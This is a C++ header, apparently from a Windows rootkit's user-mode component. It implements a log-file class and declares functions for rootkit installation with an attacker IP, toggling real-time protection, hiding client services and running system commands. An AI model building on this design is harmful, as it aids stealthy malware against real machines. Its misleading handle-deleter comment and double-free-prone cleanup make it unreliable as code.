#pragma once
#include "medium.h"


typedef struct _REPLACEMENT {
    char* Replace;
    char WhereTo;
    int RepCount;
} REPLACEMENT, * PREPLACEMENT;


typedef struct _RETURN_LAST {
    DWORD LastError;
    LSTATUS Represent;
} RETURN_LAST, * PRETURN_LAST;


// Class used to write log files:
class LogFile {
public:
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    char* FilePath = NULL;

    DWORD InitiateFile(const char* Name) {
        FilePath = (char*)malloc(strlen(Name) + 1);
        if (FilePath == NULL) {
            return GetLastError();
        }
        memcpy(FilePath, Name, strlen(Name) + 1);

        FileHandle = CreateFileA(Name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (FileHandle == INVALID_HANDLE_VALUE) {
            free(FilePath);
            return GetLastError();
        }
        return 0;
    }

    DWORD WriteLog(PVOID Buffer, DWORD Size) {
        DWORD Written = 0;
        if (!WriteFile(FileHandle, Buffer, Size, &Written, NULL) || Written != Size) {
            if (FilePath != NULL) {
                free(FilePath);
            }
            if (FileHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(FileHandle);
            }
            return GetLastError();
        }
        return 0;
    }

    void WriteError(const char* Message, DWORD Value) {
        char ValueStr[100] = { 0 };
        char Backs = '\n';

        if (WriteLog((PVOID)Message, (DWORD)strlen(Message) + 1) == 0) {
            _itoa_s((int)Value, ValueStr, 10);
            if (WriteLog((PVOID)ValueStr, (DWORD)strlen(ValueStr) + 1) == 0) {
                WriteLog(&Backs, 1);
            }
        }
        if (FilePath != NULL) {
            free(FilePath);
        }
        if (FileHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(FileHandle);
        }
    }

    void CloseLog() {
        if (FilePath != NULL) {
            free(FilePath);
        }
        if (FileHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(FileHandle);
        }
    }
    
    void RenewLog() {
        FileHandle = CreateFileA(FilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
};


// Get process handle:
struct GetHandle {  // iterates through possible handles 
    using pointer = HANDLE;
    void operator()(HANDLE Handle) const {
        if (Handle != NULL && Handle != INVALID_HANDLE_VALUE) {
            CloseHandle(Handle);  // take the first valid handle that comes up by closing it and using it after
        }
    }
};
using UniqueHndl = std::unique_ptr<HANDLE, GetHandle>;


namespace GeneralHelpers {
    std::uint32_t GetPID(std::string PrcName);
    int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
    int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
    std::wstring GetCurrentPath();
    int CountOccurrences(const char* SearchStr, char SearchLetter);
    void GetServiceName(char* Path, char* Buffer);
    void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
    DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
    void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
    int GetPidByName(const char* Name);
    int CheckLetterInArr(char Chr, const char* Arr);
    BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
    BOOL DoesPathEndWithFile(char* DirPath);
    HANDLE StartThread(PVOID ThreadAddress, PVOID ThreadParameters);
    ULONG CalculateAddressValue(char* IpAddress);
}

namespace RootkitInstall {
    int VerifyDependencies(const char* AttackerIp);
    BOOL WINAPI CtrlHandler(DWORD ControlType);
    RETURN_LAST RealTime(BOOL IsDisable);
}

namespace RequestHelpers {
    BOOL ValidateInfoTypeString(const char* InfoType);
    void LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode);
    BOOL ShouldQuit();
    int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite);
    ROOTKIT_UNEXERR ResolvePID(char* ModuleName, ULONG64* ProcessId);
}

namespace MajorOperation {
    int TerminateMedium(NETWORK_INFO* SndInfo, HANDLE* PipeHandle, BOOL* IsValidPipe, int ReturnStatus);
    DWORD ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe);
    void ClientServiceThread(PVOID ServiceParameters);
    BOOL InitializeClientServices();
    BOOL HideClientServices(HANDLE* PipeHandle, LogFile* MediumLog, ULONG AddressInfo);
}